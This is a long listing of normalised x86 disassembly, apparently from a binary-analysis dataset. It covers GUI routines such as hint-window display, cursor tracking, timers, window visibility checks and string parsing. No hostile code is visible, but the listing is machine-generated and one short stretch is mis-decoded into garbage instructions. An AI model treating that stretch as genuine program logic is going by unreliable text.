mov esi eax
xor eax eax
push ebp
push sub_462400
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_462884
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46304c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462407
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_462418
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4036c0
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_441f04
jmp r-xdata
sub_462468
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45fad8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_448484
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45fac4
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_448484
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_4624cc
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_440610
mov esi eax
test esi esi
je r-xdata
call sub_43ef20
mov edi eax
cmp esi [ ebx + 0x48 ]
je r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
xor esi esi
test edi edi
je r-xdata
test edi edi
je r-xdata
mov [ ebx + 0x48 ] esi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp edi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_442f30
test edi edi
je r-xdata
test edi edi
je r-xdata
cmp edi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_442f30
sub_462550
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46265e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4624cc
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_460640
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43eedc
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_46270c
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403ba0#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xea ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
mov eax [ ebp - 0x4 ]
call sub_462aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_462468
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
call sub_41e078
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462665
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404450
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_46266c
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45fabc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45faa8
movzx edx di
xor ecx ecx
call sub_442f30
inc esi
dec ebx
jne r-xdata
sub_4626a8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4617f0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_4617f0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_46266c
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_46270c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404828
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_404480
cmp [ ebx + 0xe2 ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b918
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44e600
xor eax eax
push ebp
push sub_462791
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
mov edx ebx
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
jmp r-xdata
sub_4627a0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_4627fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45fabc
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_4627a0
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45faa8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4627a0
pop ecx
jmp r-xdata
mov eax ebx
call sub_448788
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_448484
push eax
call IsChild
test eax eax
jne r-xdata
sub_462884
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_406194
call sub_42a40c
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_4628ac
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_4628f0
push sub_460698
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_462aa4
sub_462918
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_407494
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44187c
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_440610
call sub_460678
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_462aa4
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_407494
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44187c
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_462aa4
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_4628ac
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_442f30
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_462c90
jmp r-xdata
sub_462a28
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4628f0
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_462c90
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_462a60
jmp r-xdata
sub_462a60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_448484
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_448484
push eax
call ShowWindow
sub_462aa4
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_462a60
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_460800
mov eax ebx
call sub_4628f0
sub_462adc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_462c1e
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_423788
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_40859c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_462bef
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_423840
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462bf6
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_402764
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_462acc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_462acc
mov [ ebp - 0x4 ] eax
sub_462bf6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_462c30
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4036c0
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403608
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_462c90
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404e08
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46303b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_462aa4
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4628ac
jmp r-xdata
call sub_4590b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463042
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_404450
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404ed8
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_440610
call sub_460678
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_462adc
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45fa3c
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_441704
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4418a8
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_460640
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43ee98
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_4044c4
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_442f30
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x11a ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x11c ]
call [ esi + 0x118 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_462c30
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_4038bc
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44187c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44187c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_441f04
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd0 ]
call sub_46078c
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x28 ]
call sub_422348
add eax 0x5
sub [ ebp - 0x70 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x28 ]
call sub_422348
add eax 0x5
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_4628ac
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4628ac
jmp r-xdata
sub_46304c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_404480
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_404480
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4630ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_4630d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_442f30
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_442f30
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44e4c8
sub_463168
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xba ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_463190
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46323d
loope r-xdata
inc ebp
add al ch
mov ebx 0x33fffb28
rcr [ edx + 0x59 ] 0x59
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_463297
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
mov [ fs : eax ] edx
push sub_46329e
retn
xor eax eax
pop edx
pop ecx
pop ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_458e60
mov eax sub_4590e0
call sub_415b44
mov eax [ rw-data ]
push eax
call CloseHandle
sub_463308
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_4046e4
cmp edi eax
jg r-xdata
mov eax esi
call sub_4046e4
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40c81c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_4046e4
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_4046e4
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40c81c
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_4046e4
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_4046e4
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c81c
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c81c
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_46345c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_4046e4
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_463308
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_4634d8
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_4634f8
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_463702
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_404480
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46345c
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_4046e4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4046e4
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4046e4
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463709
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_404450
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_40493c
